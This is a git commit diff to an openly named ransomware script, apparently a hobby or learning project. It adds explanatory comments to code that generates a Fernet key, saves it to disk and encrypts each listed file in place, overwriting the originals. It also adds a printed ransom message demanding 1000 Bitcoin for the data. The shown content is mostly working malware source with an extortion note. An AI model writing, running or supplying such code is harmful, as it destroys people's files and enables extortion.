e8a1cb171d3d77fe577242fa02750ac017c33560
Nitin-0 <105773454+Nitin-0@users.noreply.github.com>
2022-07-28 20:06:56 +0530

    Update ransomeware.py

--- ransomeware.py
+++ ransomeware.py
@@ -19,18 +19,18 @@ key = Fernet.generate_key()
 
 #need to save the key
 
-with open("thekey", "wb") as lock:
+with open("thekey", "wb") as lock:  #wb is write mode and b is binary . Its nothing to confused about
 	lock.write(key)
 
 
 #now for the encryption
 
 for file in files:
-	with open(file, "rb") as destroy:
+	with open(file, "rb") as destroy:          # r is read mode and b is binary
 		content = destroy.read()
 	content_encrypted = Fernet(key).encrypt(content)
 	with open(file, "wb") as destroy:
 		destroy.write(content_encrypted)
 
-
+print("Your Files has benn encrypted !! Send 1000 Bit coin if you want your Data back . HAHAHAHA") #just some threating message here!!
 print(files)
